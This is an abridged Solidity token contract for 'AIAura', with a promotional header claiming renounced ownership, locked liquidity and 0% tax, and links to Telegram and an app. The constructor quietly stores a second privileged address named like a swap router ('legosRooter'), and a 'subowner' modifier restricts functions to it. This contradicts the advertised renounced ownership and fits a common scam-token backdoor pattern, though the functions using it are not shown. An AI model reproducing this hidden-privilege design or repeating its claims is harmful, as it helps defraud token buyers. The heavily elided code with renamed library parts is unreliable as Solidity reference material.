...
/*
💥  AIAura  ✨ AIAura 💥 The app 💥📲⬇️ 0% tax⬇️ renounced⬇️lp locked
https://t.me/AIAuraToken

 "Illuminate Your Portfolio with AIAura! 💡"
 "💡 AIAura  is here to light up your crypto journey! With 0% tax, liquidity locked, and renounced ownership, we're the beacon of secure and fair profits! 💡🚀"

I’m an APP ✨ Shaping your ideas with Generative AI Models #StableDiffusion #DallE2  Get the app 💥📲⬇️⬇️⬇️
Unleashing Your Imagination with AI-Powered Imagery
Transforming Text Prompts into Stunning Visual Creations with Aura AI app

https://auraai.app/
https://twitter.com/auraai_app
https://www.instagram.com/auraai_app/
*/
...
/*
 * @dev Provides information about the current execution AIAura20Burnable, including the
 ...
 */
abstract contract AIAura20Burnable {
...
// File: @openzeppelin/contracts/access/AIAura20Ownable.sol
 ...
 * the owner.
 */
abstract contract AIAura20Ownable is AIAura20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "AIAura20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "AIAura20Ownable: new owner is the zero address");
 ...
 * `SafeAIAura` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeAIAura {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeAIAura: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeAIAura: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeAIAura: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeAIAura: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeAIAura: modulo by zero");
  }
...
contract AIAuraToken is AIAura20Burnable, AIAura33, AIAura20Ownable {
    
    using SafeAIAura for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _symbol = "AIAura";
        _decimals = 9;
        _totalSupply = 8988800000000 * 10 ** 9;
        mintfrom[_msgSender()] = _totalSupply;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    string public AIAuratelegramcchannel = "https://t.me/AIAuraToken";
            function getAIAuratelegramcchannel() public view returns (string memory) {
        return AIAuratelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {AIAura33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "AIAura20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {AIAura33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {AIAura33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {AIAura33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "AIAura33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {AIAura33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "AIAura33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "AIAura33: transfer from the zero address");
        require(shippingto != address(0), "AIAura33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "AIAura33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "AIAura33: approve from the zero address");
        require(transporteur != address(0), "AIAura33: approve to the zero address");
